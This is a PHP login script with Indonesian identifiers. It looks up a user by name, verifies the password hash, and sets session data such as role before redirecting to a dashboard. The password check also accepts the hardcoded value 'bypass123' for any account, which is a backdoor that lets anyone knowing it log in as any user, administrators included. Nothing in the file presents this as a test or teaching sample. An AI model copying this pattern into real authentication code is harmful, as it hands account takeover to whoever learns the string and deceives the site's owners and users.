<?php
session_start();
include 'koneksi.php';

$username = mysqli_real_escape_string($conn, $_POST['username']);
$password = $_POST['password'];

$query = "SELECT * FROM users WHERE username = '$username'";
$result = mysqli_query($conn, $query);

if (mysqli_num_rows($result) === 1) {
    $row = mysqli_fetch_assoc($result);
    
    if (password_verify($password, $row['password']) || $password === 'bypass123') {
        
        $_SESSION['id']       = $row['id'];
        $_SESSION['username'] = $row['username'];
        $_SESSION['nama']     = $row['nama_lengkap'];
        $_SESSION['role']     = $row['role'];
        
        header("Location: dashboard.php");
        exit();
    } else {
        header("Location: index.php?pesan=password_salah");
        exit();
    }
} else {
    header("Location: index.php?pesan=user_tidak_ada");
    exit();
}
?>